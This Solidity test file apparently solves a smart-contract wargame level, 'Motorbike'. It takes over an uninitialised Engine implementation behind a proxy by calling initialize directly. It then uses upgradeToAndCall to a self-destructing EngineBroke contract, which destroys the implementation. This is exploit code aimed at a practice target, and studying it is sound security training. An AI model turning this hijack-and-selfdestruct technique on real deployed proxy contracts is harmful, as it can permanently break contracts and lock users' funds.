// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;


import {Motorbike, Engine} from "../src/motorbike/Motorbike.sol";
import {EngineBroke} from "../src/motorbike/EngineBroke.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";
import "openzeppelin-contracts-06/utils/Address.sol";


contract Solver {
    uint public horsePower;

    function destroy(address payable benefit) external {
        selfdestruct(benefit);
    }
}

contract MotorbikeTest is Test {
    Motorbike public sc;
    Engine public engine;
    EngineBroke public engineBroke;

    function setUp() public {
        engine = new Engine();
        sc = new Motorbike(address(engine));
        console2.log(Engine(address(sc)).upgrader());
        console2.log(address(this));
        console2.log(engine.upgrader());

        vm.startBroadcast(account.ACC_PRIVATE_KEY_0);
        engine.initialize();
        console2.log(engine.upgrader());
        engineBroke = new EngineBroke();
        // self destruct has to be in setUp or it won't be efficient in test case
        console2.log(engineBroke.upgrader());
        bytes memory _data = abi.encodeWithSignature("destruct(address)", account.ACC_0);
        engine.upgradeToAndCall(address(engineBroke), _data);
    }

    function test_Hack() public {
        //console2.log(Engine(address(sc)).horsePower());
        console2.log(Address.isContract(address(engine)));
        //console2.log(engineBroke.horsePower());
    }
}
